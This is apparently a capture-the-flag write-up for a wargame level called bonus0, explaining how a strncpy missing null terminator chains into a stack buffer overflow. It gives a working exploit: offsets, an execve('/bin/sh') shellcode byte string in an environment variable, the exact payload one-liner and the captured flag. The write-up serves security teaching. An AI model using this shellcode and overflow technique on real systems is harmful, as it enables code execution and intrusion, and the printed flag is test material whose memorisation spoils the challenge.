# 🎯 Bonus0 - Null-Byte Poisoning Buffer Overflow

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Classic string handling vulnerability - when strncpy forgets the null terminator!

## 📋 Binary Analysis

### 🎯 p() - The Null-Byte Killer

```c
void p(char *dest, char *prompt)
{
	char buffer[4096];
	
	puts(prompt);
	read(0, buffer, 4096);
	
	// Find newline and replace with null terminator
	char *newline = strchr(buffer, '\n');
	*newline = '\0';
	
	// ⚠️ CRITICAL VULNERABILITY: strncpy does NOT null-terminate if source >= n!
	// If user inputs 20+ characters, dest will have NO null terminator
	// This leads to out-of-bounds reads in strcpy() later
	strncpy(dest, buffer, 20);
}
```

**The strncpy() Trap:**
- Copies **exactly** 20 bytes from `buffer` to `dest`
- If input is 20+ characters → **NO null terminator added!**
- This violates the assumption that C strings are null-terminated
- Sets up the next function for exploitation

---

### 🎯 pp() - The Overflow Amplifier

```c
void pp(char *output_buffer)
{
	char first_input[20];   // First 20-byte buffer
	char second_input[20];  // Second 20-byte buffer
	
	// Read first input (up to 20 bytes, may not be null-terminated!)
	p(first_input, " - ");
	
	// Read second input (up to 20 bytes, may not be null-terminated!)
	p(second_input, " - ");
	
	// ⚠️ VULNERABILITY 1: strcpy expects null-terminated string
	// If first_input has no null terminator, strcpy will read past it into second_input!
	strcpy(output_buffer, first_input);
	
	// Calculate length of what was copied
	// (This is just strlen reimplemented)
	size_t len = 0;
	while (output_buffer[len] != '\0') {
		len++;
	}
	
	// Add space separator at the end of the copied string
	output_buffer[len] = ' ';
	output_buffer[len + 1] = '\0';
	
	// ⚠️ VULNERABILITY 2: strcat concatenates without bounds checking
	// Can overflow output_buffer if combined length > 54 bytes
	strcat(output_buffer, second_input);
}
```

**The Cascade Effect:**
1. `first_input` and `second_input` are adjacent 20-byte buffers
2. If `first_input` has no null terminator, `strcpy()` reads into `second_input`
3. This copies **40 bytes** instead of 20
4. Then adds a space (1 byte)
5. Then `strcat()` adds another **20 bytes** from `second_input`
6. **Total: 61 bytes written into main's 54-byte buffer!**

---

### 🎯 main() - The Victim

```c
int main(void)
{
	char buffer[54];      // ⚠️ Only 54 bytes!
	
	pp(buffer);           // Writes up to 61 bytes → overflow!
	puts(buffer);
	return 0;
}
```

---

### 🔑 Key Addresses

| Element | Address | Notes |
|---------|---------|-------|
| **SHELLCODE env** | `0xbffffd44` | Environment variable location |
| **Shellcode start** | `0xbffffd58` | After "SHELLCODE=" string (+20 bytes) |
| **EIP overwrite** | Position 9-12 of input 2 | Found via pattern analysis or testing |

---

## 🚨 Vulnerability

### The Problem

The `strncpy()` function has a **dangerous quirk**:

```c
strncpy(dest, src, n);
```

**Behavior:**
- Copies **at most** `n` bytes from `src` to `dest`
- **If `src` has `n` or more characters** → copies exactly `n` bytes, **NO null terminator added!**
- **If `src` has fewer than `n` characters** → copies string + pads rest with null bytes

**Example:**

```c
char dest[20];
char src1[] = "short";           // 5 chars + null
char src2[] = "exactlytwentychars!!";  // 20 chars (no room for null!)

strncpy(dest, src1, 20);  // Result: "short\0\0\0\0..." (null-terminated ✅)
strncpy(dest, src2, 20);  // Result: "exactlytwentychars!!" (NO null! ❌)
```

**Why this is dangerous:**
- Other string functions (`strcpy`, `strlen`, `strcat`) **expect null terminators**
- Without null bytes, they **read past buffer boundaries**
- This creates a "null-byte poisoning" attack vector

---

### Memory Layout

**Stack layout in pp():**

```
Low Address
┌────────────────────────┐
│ first_input [20 bytes] │ ← First input (may lack \0)
│ AAAAAAAAAAAAAAAAAAAA   │
├────────────────────────┤
│ second_input [20 bytes]│ ← Second input (may lack \0)
│ BBBBBBBBBBBBBBBBBBBB   │
├────────────────────────┤
│ [other stack data]     │
├────────────────────────┤
│ saved EBP              │
├────────────────────────┤
│ return address         │ ← Target for overwrite!
└────────────────────────┘
High Address
```

**What happens when both buffers lack null terminators:**

```
strcpy(output_buffer, first_input):
- Looks for null terminator in first_input
- Doesn't find it (20 bytes, no null)
- Keeps reading into second_input
- Copies: "AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB" (40 bytes!)

strlen(output_buffer):
- Scans for null terminator
- Finds it at position 40
- Returns length 40

Add space and null:
output_buffer[40] = ' '
output_buffer[41] = '\0'
- Now: "AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB \0"

strcat(output_buffer, second_input):
- Appends second_input starting at output_buffer[40]
- Writes: "AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBBBBB\0"
- Total length: 40 + 1 + 20 = 61 bytes
```

**Overflow calculation:**

```
Main's buffer size: 54 bytes
Data written: 61 bytes
Overflow: 61 - 54 = 7 bytes

Memory layout after overflow:
┌────────────────────────────────────────────┐
│ buffer[54] = "AAA...BBB...BBB BBB...BBB"  │ 54 bytes
├────────────────────────────────────────────┤
│ saved EBP                                  │ 4 bytes (partially overwritten)
├────────────────────────────────────────────┤
│ return address = 0x????????               │ 4 bytes (overwritten! ✅)
└────────────────────────────────────────────┘
```

---

## 🎯 How the Exploit Works

### The Three-Phase Attack

#### Phase 1: Null-Byte Poisoning

**Goal:** Remove null terminators from both buffers

**Technique:**
- Input exactly **20 characters** to each `p()` call
- `strncpy()` copies all 20 bytes with **no null terminator**
- Both `local_34` and `local_20` are now "poisoned" (no null bytes)

**Result:**
```
first_input:  [A][A][A]...[A][A] (20 bytes, no \0)
second_input: [B][B][B]...[B][B] (20 bytes, no \0)
```

---

#### Phase 2: Controlled Overflow

**Goal:** Overflow main's buffer to overwrite return address

**Technique:**
- `strcpy()` reads past `first_input` into `second_input` (40 bytes)
- Add space separator (1 byte)
- `strcat()` adds `second_input` again (20 bytes)
- **Total: 61 bytes into 54-byte buffer**

**Payload structure for input 2:**
```
[9 bytes padding][4 bytes return address][7 bytes overflow]
 └─ "BBBBBBBBB" └─ 0xbffffd58 (shellcode) └─ "CCCCCCC"
```

**Finding the EIP offset using Ghidra:**

From `main()` disassembly:
```
SUB ESP, 0x40              # Stack frame: 64 bytes
LEA EAX, [ESP + 0x16]      # buffer[54] at ESP + 0x16
```

**Calculate offset to return address:**
```
buffer[54] start: ESP + 0x16
Return address:   ESP + 0x50 (after buffer + saved EBP)
Offset: 0x50 - 0x16 = 0x3A = 58 bytes from buffer start
```

**Understanding the overflow:**
```
Written: 61 bytes total
  - strcpy:  40 bytes (first_input + second_input leak)
  - space:    1 byte
  - strcat:  20 bytes (second_input again)

Layout:
  [0-53]:   buffer[54]     54 bytes
  [54-57]:  saved EBP       4 bytes  
  [58-61]:  return address  4 bytes ← target!
```

**Why bytes 9-12 of input 2 overwrite EIP:**

The complexity comes from second_input being written twice (once via strcpy overflow, once via strcat). Through testing or using a cyclic pattern, we find that bytes 9-12 of input 2 land at the return address position. This is the empirically determined offset that successfully overwrites EIP.

> 💡 **Pro Tip:** To find EIP offsets yourself, use a cyclic De Bruijn sequence pattern (e.g., with pwntools or msf-pattern) as input 2, then check which 4-byte sequence appears in EIP when the program crashes.

---

#### Phase 3: Environment Variable Shellcode

**Goal:** Execute shellcode from a predictable memory location

**Why environment variables?**
- No size constraints (unlike stack/heap buffers)
- Predictable addresses (no ASLR on this system)
- Survives across function calls
- Located on the stack, above main's frame

**Setup:**
```bash
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0...\xcd\x80"')
```

**Memory layout:**
```
Environment space (high stack addresses):
┌─────────────────────────────────────────────┐
│ SHELLCODE=\x90\x90\x90....[24-byte shellcode]│ ← 0xbffffd44
│            └─200 NOPs─────┘                 │
└─────────────────────────────────────────────┘
         ↑
         └─ We jump to 0xbffffd58 (NOP sled)
```

**Why the NOP sled?**
- Gives us a **200-byte landing zone**
- Even if address is slightly off, we'll hit a NOP
- NOPs "slide" execution down to the shellcode
- Makes exploit more reliable

---

### Complete Execution Flow

```
┌─ 1. User runs exploit ─────────────────────────────────────┐
│   Input 1: "AAAAAAAAAAAAAAAAAAAA" (20 A's)                 │
│   Input 2: "BBBBBBBBB\x58\xfd\xff\xbfCCCCCCC"              │
└────────────────────────────────────────────────────────────┘
                          ↓
┌─ 2. p() processes inputs ──────────────────────────────────┐
│   strncpy(first_input, "AAA...A", 20) → no null terminator!│
│   strncpy(second_input, "BBB...B\x58...", 20) → no null!  │
└────────────────────────────────────────────────────────────┘
                          ↓
┌─ 3. pp() creates overflow ─────────────────────────────────┐
│   strcpy(): reads 40 bytes (first_input + second_input)    │
│   Adds space: 41 bytes total                              │
│   strcat(): adds 20 more bytes from second_input          │
│   Total: 61 bytes into 54-byte buffer                     │
└────────────────────────────────────────────────────────────┘
                          ↓
┌─ 4. Return address overwritten ────────────────────────────┐
│   Stack before:  [buffer][EBP][0x08048xxx] ← normal       │
│   Stack after:   [buffer][EBP][0xbffffd58] ← shellcode!   │
└────────────────────────────────────────────────────────────┘
                          ↓
┌─ 5. Function returns ──────────────────────────────────────┐
│   ret instruction: EIP = 0xbffffd58                        │
│   CPU jumps to environment variable                        │
└────────────────────────────────────────────────────────────┘
                          ↓
┌─ 6. Shellcode executes ────────────────────────────────────┐
│   Lands in NOP sled (\x90\x90\x90...)                     │
│   Slides down to shellcode                                 │
│   execve("/bin/sh", NULL, NULL)                           │
└────────────────────────────────────────────────────────────┘
                          ↓
                    🎉 Shell spawned! 🎉
```

---

### Why This Works

| Requirement | Status | Explanation |
|-------------|--------|-------------|
| **Buffer overflow** | ✅ | `strncpy()` no null + `strcpy()` no bounds = 61 bytes into 54-byte buffer |
| **EIP control** | ✅ | Bytes 9-12 of input 2 directly overwrite return address |
| **Shellcode location** | ✅ | Environment variable at predictable address `0xbffffd58` |
| **Executable memory** | ✅ | No DEP/NX → stack is executable |
| **Predictable addresses** | ✅ | No ASLR → addresses are the same every run |
| **No stack canaries** | ✅ | No stack protection → overflow goes undetected |

---

### Key Insight

Bonus0 builds on techniques from earlier levels, specifically Level2's return-to-heap approach, but uses a **more flexible technique**:

**Level2 (Return-to-Heap):**
- Used `strdup()` to copy shellcode to heap
- Heap address: `0x0804a008`
- Size limited by buffer length (80 bytes)
- Required bypassing stack address check (`0xb0000000`)

**Bonus0 (Return-to-Environment):**
- Uses environment variables for shellcode storage
- Environment address: `0xbffffd58` (high stack)
- **No size constraints** (can be kilobytes if needed!)
- More reliable with NOP sled (200-byte landing zone)
- Addresses are in stack range but above overflow location

The environment variable technique is more powerful because:
1. **Unlimited size** - can store complex payloads
2. **Persistent** - survives across multiple executions
3. **Predictable** - always at similar addresses (no ASLR)
4. **Flexible** - can store multiple payloads or ROP chains

This evolution shows how attackers adapt to different constraints while maintaining the core exploitation principle: control EIP and execute arbitrary code.

---

## 💣 Execute the Exploit

### Step 1: Export Shellcode

```bash
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

**Shellcode breakdown:**
- **200 NOPs (`\x90`)**: Landing zone for imprecise jumps
- **24-byte execve shellcode**: Spawns `/bin/sh`

**Source:** [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428) by Touhid M.Shaikh (24-byte null-free execve)

> 💡 This is the same shellcode used in **level2** and **level9**. See [level2 documentation](../../level2/Ressources/README.md#the-shellcode) for detailed assembly analysis.

---

### Step 2: Calculate Shellcode Address

The address `0xbffffd58` is calculated based on stack layout analysis.

**From Ghidra analysis:**

In `pp()` function:
- `first_input` (local_34): EBP - 0x30
- `second_input` (local_20): EBP - 0x1c

In `main()` function:
- `buffer[54]` (local_3a): ESP + 0x16
- Stack frame: 64 bytes (SUB ESP, 0x40)

**Environment variable location:**

Environment variables are stored at high stack addresses (above main's frame):
- SHELLCODE variable starts at: ~0xbffffd44
- String "SHELLCODE=" length: 20 bytes (0x14)
- Shellcode begins at: 0xbffffd44 + 0x14 = **0xbffffd58**

**Why this works:**
- No ASLR → stack addresses are predictable
- 200-byte NOP sled → large landing zone (±100 bytes tolerance)
- Environment variables → consistent high stack location

---

### Step 3: Run the Exploit

```bash
(python -c 'print "A"*20'; python -c 'print "B"*9 + "\x58\xfd\xff\xbf" + "C"*7'; cat) | ./bonus0
```

**Payload breakdown:**
- **Input 1:** `"A"*20` (fills `local_34` with no null terminator)
- **Input 2:** 
  - `"B"*9` (padding to reach return address position)
  - `"\x58\xfd\xff\xbf"` (shellcode address in little-endian: `0xbffffd58`)
  - `"C"*7` (remaining overflow bytes)
- **`cat`:** Keeps stdin open for shell interaction

---

### Step 4: Read the Flag

Once you get the shell prompt:

```bash
cat /home/user/bonus1/.pass
```

**Result:**
```
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

---

> 💡 **Pro Tip**: Use `(payload; cat) | ./binary` to keep stdin open for shell interaction! The `cat` command prevents the pipe from closing.

> ⚠️ **Security Note**: Modern defenses include [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) (randomizes addresses), [DEP/NX](https://en.wikipedia.org/wiki/Executable_space_protection) (non-executable stack), and [FORTIFY_SOURCE](https://access.redhat.com/blogs/766093/posts/1976213) (bounds checking). Always use safe string functions like `strlcpy()` instead of `strncpy()`!

---

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
